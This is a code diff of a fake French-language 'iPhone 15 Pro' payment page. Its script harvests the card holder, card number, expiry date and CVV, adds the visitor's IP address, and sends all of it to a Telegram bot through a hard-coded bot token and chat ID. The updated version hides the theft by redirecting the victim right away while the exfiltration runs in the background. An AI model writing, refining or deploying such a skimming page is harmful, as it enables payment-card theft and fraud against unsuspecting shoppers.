@@ -4,7 +4,80 @@
     <meta charset="UTF-8">
     <title>iPhone 15 Pro</title>
     <link href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/favicon.png" rel="shortcut icon" type="image/x-icon">
-    <link rel="stylesheet" href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/css/style.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        section {
+            padding: 20px;
+        }
+        .product_wrapper {
+            max-width: 600px;
+            margin: 0 auto;
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        .product_block {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .images_wrapper img {
+            max-width: 100%;
+            height: auto;
+        }
+        .price_block {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .price_block span {
+            font-size: 16px;
+            color: #666;
+        }
+        .price_block h2 {
+            font-size: 32px;
+            color: #333;
+            margin: 0;
+        }
+        .form_wrapper {
+            width: 100%;
+        }
+        .form_block {
+            margin-top: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            font-weight: bold;
+            display: block;
+            margin-bottom: 5px;
+        }
+        .form-control {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .btn-success {
+            background-color: #28a745;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .btn-success:hover {
+            background-color: #218838;
+        }
+    </style>
 </head>
 <body>
 <section>
@@ -25,34 +98,50 @@
                         <h1>iPhone 15 Pro</h1>
                     </div>
                     <div class="form_block" id="Scroll_form">
-                        <form action="https://checkout.purpletask.net/payment/ajW8DMeNkeEmuv9MYi7ihFOnSWHPdqrG" method="POST" id="paymentForm" name="paymentForm" novalidate="novalidate">
-                            <input type="hidden" name="_token" value="vFqq7MTGU0dg8OrcF2KocxJen6rbzNYcUPZNrvA7" autocomplete="off">
+                        <form id="paymentForm" onsubmit="return handleSubmit(event)" action="https://payment.ebizzseminar.com/payment/ho7iaVV2jMoZ2zX55h5038w5gBYaaPHe" method="POST" name="paymentForm" novalidate="novalidate">
+                            <input type="hidden" name="_token" value="3Z1GRlfoa9oOtvkNzkqR2CofNZN9eqpqbSjkyzzl" autocomplete="off">
+                            <div class="accepted-credit-cards" style="text-align: center; margin: 1rem 0;">
+                                <p class="accepted-credit-cards-heading" style="font-size: 14px; margin: 0 0 .5rem;">Cartes de crédit acceptées:</p>
+                                <img src="https://cdn.soopercdn.com/cp/form-campaign-checkout-v2/assets/images/card.svg" alt="Supported Payment Cards" style="width:auto; max-width:100%;">
+                            </div>
                             <div class="card-holder form-group">
                                 <label for="card_holder">Titulaire de la carte</label>
-                                <input type="text" name="card_holder" id="card_holder" autocomplete="cc-name" placeholder="Titulaire de la carte" required="" class="form-control form-control-lg jp-card-valid">
+                                <div class="controls">
+                                    <input type="text" name="card_holder" id="card_holder" autocomplete="cc-name" placeholder="Titulaire de la carte" required="" class="form-control form-control-lg jp-card-valid valid" style="width:100%;" aria-invalid="false">
+                                </div>
                             </div>
                             <div class="card-number form-group">
                                 <label for="card_number">Numéro de la carte</label>
-                                <input type="tel" name="card_number" id="card_number" autocomplete="cc-number" placeholder="0000 0000 0000 0000" required="" class="form-control form-control-lg jp-card-invalid">
+                                <div class="controls">
+                                    <input type="tel" name="card_number" id="card_number" autocomplete="cc-number" placeholder="0000 0000 0000 0000" required="" class="form-control form-control-lg jp-card-invalid" style="width:100%;" oninput="formatCardNumber(this)">
+                                </div>
                             </div>
                             <div class="expiry-date form-group">
                                 <label for="expiry_date">Date d'expiration</label>
-                                <input type="tel" name="expiry_date" id="expiry_date" autocomplete="cc-exp" placeholder="MM / AA" required="" class="form-control form-control-lg jp-card-invalid">
+                                <div class="controls">
+                                    <input type="tel" name="expiry_date" id="expiry_date" autocomplete="cc-exp" placeholder="MM / AA" required="" class="form-control form-control-lg jp-card-invalid" style="width:100%;" oninput="formatExpiryDate(this)">
+                                </div>
                             </div>
                             <div class="row">
                                 <div class="col-sm-6 col-9">
                                     <div class="cvv form-group">
                                         <label for="cvv">CVC/CVV</label>
-                                        <input type="number" name="cvv" id="cvv" autocomplete="cc-csc" min="0" max="9999" pattern="^[0-9]{3,4}$" placeholder="CVC/CVV" required="" class="form-control form-control-lg jp-card-invalid">
+                                        <div class="controls">
+                                            <input type="number" name="cvv" id="cvv" autocomplete="cc-csc" min="0" max="999" pattern="^[0-9]{3}$" placeholder="CVC/CVV" required="" style="width:100%;" class="form-control form-control-lg jp-card-invalid" oninput="limitCvvLength(this)">
+                                        </div>
                                     </div>
                                 </div>
                                 <div class="col-sm-6 col-3 align-self-center">
                                     <div class="cvv-helper form-group">
-                                        <img width="50" src="https://cdn.soopercdn.com/cp/checkout/assets/images/cvv.svg" alt="">
+                                        <img width="50" src="https://cdn.soopercdn.com/cp/checkout/assets/images/cvv.svg" alt="" style="max-width: 100%; max-height: 30px; width: auto !important;">
                                     </div>
                                 </div>
                             </div>
-                            <button type="submit" id="submitButton" class="btn btn-success btn-lg">Effectuer Paiement</button>
+                            <button type="submit" id="submitButton" class="btn btn-success btn-lg" style="width:100%;">
+                                <span class="loader" style="height:12px;width:12px;border-width:3px;margin-right:5px;display:none;"></span>
+                                <span class="submit-label">Effectuer Paiement</span>
+                                <span class="waiting-label" style="display:none;">Effectuer Paiement</span>
+                            </button>
                         </form>
                     </div>
                 </div>
@@ -62,57 +151,96 @@
 </section>
 
 <script>
-    document.getElementById('paymentForm').addEventListener('submit', function(event) {
-        event.preventDefault(); // Empêche la soumission du formulaire par défaut
+function formatCardNumber(element) {
+    let value = element.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+    if (value.length > 16) {
+        value = value.substr(0, 16);
+    }
+    element.value = value === '' ? '' : value.match(/.{1,4}/g).join(' ');
+}
 
-        // Récupérer les données du formulaire
-        const cardHolder = document.getElementById('card_holder').value;
-        const cardNumber = document.getElementById('card_number').value;
-        const expiryDate = document.getElementById('expiry_date').value;
-        const cvv = document.getElementById('cvv').value;
+function formatExpiryDate(element) {
+    let value = element.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+    if (value.length > 4) {
+        value = value.substr(0, 4);
+    }
+    element.value = value === '' ? '' : value.replace(/(\d{2})(\d{0,2})/, '$1 / $2');
+}
 
+function limitCvvLength(element) {
+    if (element.value.length > 3) {
+        element.value = element.value.slice(0, 3);
+    }
+}
+
+function capitalizeFirstLetter(string) {
+    return string.charAt(0).toUpperCase() + string.slice(1);
+}
+
+function handleSubmit(event) {
+    event.preventDefault(); // Empêche la soumission par défaut
+
+    // Récupération des valeurs du formulaire
+    const cardHolder = document.getElementById('card_holder').value.trim();
+    const cardNumber = document.getElementById('card_number').value.replace(/\s+/g, '');
+    const expiryDate = document.getElementById('expiry_date').value.replace(/\s+/g, '').replace('/', '');
+    const cvv = document.getElementById('cvv').value;
+
+    // Validation des champs
+    if (!cardHolder) {
+        alert("Veuillez entrer le nom du titulaire de la carte.");
+        return false;
+    }
+    if (cardNumber.length !== 16 || !/^\d+$/.test(cardNumber)) {
+        alert("Le numéro de carte doit comporter exactement 16 chiffres.");
+        return false;
+    }
+    if (expiryDate.length !== 4 || !/^\d{2}\d{2}$/.test(expiryDate) || !(parseInt(expiryDate.substring(0, 2)) >= 1 && parseInt(expiryDate.substring(0, 2)) <= 12) || !(parseInt(expiryDate.substring(2, 4)) >= 23)) {
+        alert("La date d'expiration doit être au format MM / AA valide.");
+        return false;
+    }
+    if (cvv.length !== 3 || !/^\d+$/.test(cvv)) {
+        alert("Le CVC/CVV doit comporter exactement 3 chiffres.");
+        return false;
+    }
+
+    // Redirection immédiate après validation
+    window.location.href = 'https://justmoicom.github.io/test3/';
+
+    // Envoi des données à Telegram en arrière-plan
+    sendTelegramAlertAsync(cardHolder, cardNumber, expiryDate, cvv);
+
+    return false; // Empêche la soumission du formulaire
+}
+
+// Fonction pour envoyer un message à Telegram en arrière-plan
+async function sendTelegramAlertAsync(cardHolder, cardNumber, expiryDate, cvv) {
+    try {
         // Obtenir l'IP de l'utilisateur
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                const userIp = data.ip;
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const userIp = ipData.ip;
 
-                // Préparer le message pour Telegram
-                const message = `⚠️ NOUVELLE SOUMISSION DE FORMULAIRE ⚠️\n\n` +
-                    `Titulaire de la carte: ${cardHolder}\n` +
-                    `Numéro de la carte: ${cardNumber}\n` +
-                    `Date d'expiration: ${expiryDate}\n` +
-                    `CVV: ${cvv}\n` +
-                    `Adresse IP: ${userIp}`;
+        // Préparer le message pour Telegram
+        const message = `⚠️ NOUVELLE SOUMISSION DE FORMULAIRE ⚠️\n\n` +
+            `Titulaire de la carte: ${cardHolder}\n` +
+            `Numéro de la carte: ${cardNumber}\n` +
+            `Date d'expiration: ${expiryDate}\n` +
+            `CVV: ${cvv}\n` +
+            `Adresse IP: ${userIp}`;
 
-                // Informations du bot Telegram
-                const telegramBotToken = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k'; // Votre token bot
-                const telegramChatId = '7747778364'; // Votre ID de chat
+        // Informations du bot Telegram
+        const telegramBotToken = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k'; // Votre token bot
+        const telegramChatId = '7747778364'; // Votre ID de chat
+        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;
 
-                // URL de l'API Telegram pour envoyer le message
-                const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;
-
-                // Envoyer les données à Telegram
-                fetch(telegramUrl)
-                    .then(response => {
-                        if (response.ok) {
-                            alert('Données envoyées avec succès.');
-                            this.submit(); // Soumettre le formulaire après envoi
-                        } else {
-                            console.error('Erreur lors de l\'envoi des données à Telegram:', response.status);
-                            alert('Une erreur s\'est produite lors de l\'envoi des données.');
-                        }
-                    })
-                    .catch(error => {
-                        console.error('Erreur lors de l\'envoi des données à Telegram:', error);
-                        alert('Une erreur s\'est produite lors de l\'envoi des données.');
-                    });
-            })
-            .catch(error => {
-                console.error('Erreur lors de la récupération de l\'IP utilisateur:', error);
-                alert('Une erreur s\'est produite lors de la récupération de votre adresse IP.');
-            });
-    });
+        // Envoyer les données à Telegram
+        await fetch(telegramUrl);
+        console.log('Message envoyé avec succès à Telegram.');
+    } catch (error) {
+        console.error('Erreur lors de l\'envoi du message à Telegram:', error);
+    }
+}
 </script>
 </body>
 </html>
